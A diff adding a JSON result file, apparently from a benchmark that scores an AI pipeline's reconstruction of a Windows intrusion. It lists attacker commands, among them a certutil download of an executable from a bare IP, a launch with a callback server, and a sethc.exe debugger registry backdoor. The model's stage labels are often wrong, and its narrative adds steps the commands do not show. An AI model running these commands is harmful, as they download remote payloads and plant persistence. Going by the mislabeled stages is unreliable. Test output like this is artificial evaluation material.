@@ -1,0 +1,91 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "taskkill /f /im agent.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "python PhpStudyPoc.py http://121.36.30.176/",
+        "stage": "Discovery"
+      },
+      {
+        "command": "del /f /q PhpStudyPoc.py",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "Reg ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\NT\\\\CurrentVersion\\\\Image File Execution Options\\\\sethc.exe /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe /f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg delete HKCU\\\\Software\\\\Google\\\\Update /va /f ",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "Reg DELETE HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\NT\\\\CurrentVersion\\\\AppCompatFlags\\\\Compatibility Assistant\\\\Store /v GoogleUpdate.exe",
+        "stage": "Defense Evasion"
+      }
+    ],
+    "narrative": "The attackers gained access through an unknown point using `certutil` and downloaded malware (`sangforcat.exe`) onto the system. They then killed running instances of the same malware, indicating they were trying to cover their tracks. The malware connects back to the attacker's server over ports 8079 and 8443. A Python script sends HTTP requests to another IP address and a PowerShell script is executed with elevated privileges. Another Python script attempts to brute-force admin accounts. Malware also downloads several files from the internet.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 43391,
+      "completion_tokens": 1742,
+      "total_tokens": 45133,
+      "wall_clock_s": 9.899,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.3,
+      "recall": 0.42857142857142855,
+      "f1": 0.3529411764705882,
+      "tp": 3,
+      "fp": 7,
+      "fn": 4
+    },
+    "stage": {
+      "precision": 0.2,
+      "recall": 0.3333333333333333,
+      "f1": 0.25,
+      "tp": 2,
+      "fp": 8,
+      "fn": 4,
+      "recall_partial": 0.3333333333333333
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 43391,
+      "completion_tokens": 1742,
+      "total_tokens": 45133,
+      "wall_clock_s": 9.899,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
